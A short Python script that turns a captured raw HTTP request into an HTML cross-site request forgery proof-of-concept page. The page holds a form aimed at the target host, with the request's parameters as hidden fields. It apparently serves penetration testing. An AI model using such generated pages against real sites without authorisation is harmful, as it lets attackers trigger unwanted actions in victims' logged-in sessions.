from urllib.parse import parse_qsl


INPUT_FILE = "request.txt"
OUTPUT_FILE = "poc.html"
DEFAULT_SCHEME = "https"


with open(INPUT_FILE, "r", encoding="utf-8") as file:
    raw_request = file.read()

lines = raw_request.splitlines()

request_line = lines[0]
method, path, version = request_line.split()

blank_line_index = lines.index("")

header_lines = lines[1:blank_line_index]
body_lines = lines[blank_line_index + 1:]

headers = {}

for line in header_lines:
    name, _, value = line.partition(":")
    headers[name.lower().strip()] = value.strip()

body = "\n".join(body_lines)
params = parse_qsl(body, keep_blank_values=True)

host = headers.get("host")
content_type = headers.get("content-type")

url = f"{DEFAULT_SCHEME}://{host}{path}"

inputs = ""

for name, value in params:
    inputs += f'        <input type="hidden" name="{name}" value="{value}">\n'

html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF PoC</title>
</head>
<body>
    <form action="{url}" method="{method}">
{inputs}        <input type="submit" value="Submit">
    </form>
</body>
</html>
"""

with open(OUTPUT_FILE, "w", encoding="utf-8") as file:
    file.write(html)

print("CSRF PoC generated successfully.")
print(f"Input: {INPUT_FILE}")
print(f"Output: {OUTPUT_FILE}")
print()
print("Parsed request:")
print(f"  method: {method}")
print(f"  path: {path}")
print(f"  version: {version}")
print(f"  host: {host}")
print(f"  content-type: {content_type}")
print(f"  body: {body}")
print(f"  params: {params}")
print(f"  url: {url}")